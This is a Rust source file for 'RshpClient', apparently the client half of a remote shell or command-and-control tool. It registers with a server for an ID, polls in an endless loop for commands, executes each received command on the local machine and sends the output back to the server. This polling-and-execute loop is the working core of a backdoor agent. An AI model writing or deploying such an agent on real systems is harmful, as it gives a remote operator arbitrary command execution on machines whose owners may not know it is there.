use crate::transporter::Transporter;
use crate::cmd::Cmd;
use crate::executor;
use std::thread;
use std::time::Duration;

pub struct RshpClient {
    id: u32,
    transporter: Transporter,
}

impl RshpClient {
    pub fn new(server: &str, port: u32) -> RshpClient {
        RshpClient {
            id: 0,
            transporter: Transporter::new(server, port),
        }
    }

    pub fn run(&mut self) {
        // Check ID settings
        self.check_id();

        loop {
            // Poll for new commands
            // GETCMD [int]id
            // CMD [string]buf
            let id = format!("{}", self.id);
            let req = Cmd::new("GETCMD", id.as_ref());
            self.transporter.send(req);

            // If TIMEOUT [int]sec sleep for [int]sec seconds and poll again
            // If CMD [string]cmd, execute() [string]cmd
            // If CLOSE return to polling
            let resp = self.transporter.recv();
            self.interperet(resp)
        }
    }

    fn interperet(&mut self, cmd: Cmd) {
        match cmd.get_directive().as_ref() {
            "SETID" => self.id = cmd.get_data().parse::<u32>().unwrap(),
            "TIMEOUT" => {
                let timeout = cmd.get_data().parse::<u64>().unwrap();
                thread::sleep(Duration::from_secs(timeout));
            },
            "CMD" => {
                let output = executor::execute(cmd.get_data().to_string());
                self.transporter.send(Cmd::new("CMDOUTPUT", output.as_ref()))
            },
            _ => {},
        }
    }

    // Check if ID has been assigned
    // If not signed, sign in with id
    // req: GETNEWID
    // resp: SETID [int]id
    fn check_id(&mut self) {
        if self.id == 0 {
            let cmd = Cmd::new("GETNEWID", "");
            self.transporter.send(cmd);
            
            let resp = self.transporter.recv();
            self.interperet(resp);
        }
    }
}